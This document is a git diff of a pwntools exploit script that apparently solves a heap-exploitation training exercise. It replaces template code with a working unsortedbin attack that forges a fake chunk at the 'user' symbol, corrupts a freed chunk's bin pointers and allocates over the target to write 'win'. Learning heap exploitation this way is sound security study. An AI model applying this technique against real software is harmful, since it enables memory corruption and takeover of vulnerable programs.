@@ -51,22 +51,36 @@ heap = int(io.recvline(), 16)
 
 # =============================================================================
 
-# =-=-=- EXAMPLE -=-=-=
+# Create fake chunk
+payload = flat(
+  0, # prev size
+  0x401, # size
+  elf.sym["user"],
+  elf.sym["user"]
+)
 
-# Populate the "username" field.
-username = b"George"
+username = payload
 io.sendafter(b"username: ", username)
 io.recvuntil(b"> ")
 
 # Request 2 "normal" chunks.
-chunk_A = malloc(0x98)
-chunk_B = malloc(0x88)
+chunk_A = malloc(0x3f8)
+guard = malloc(0x88)
+# chunk_B = malloc(0x3f8)
+# guard_2 = malloc(0x88)
 
-# Edit the first chunk.
-edit(chunk_A, b"Y"*8)
-
-# Free the first chunk into the unsortedbin.
 free(chunk_A)
+# free(chunk_B)
+
+# Request unsortedbin scann
+malloc(0x408)
+
+
+# edit(chunk_A, p64(elf.sym["user"])) # Fd 
+edit(chunk_A, p64(0) * 3 + p64(elf.sym["user"])) # Last in bins
+
+winnchunk = malloc(0x3f8)
+edit(winnchunk, p64(0x0) * 4 + b"win")
 
 # =============================================================================
 
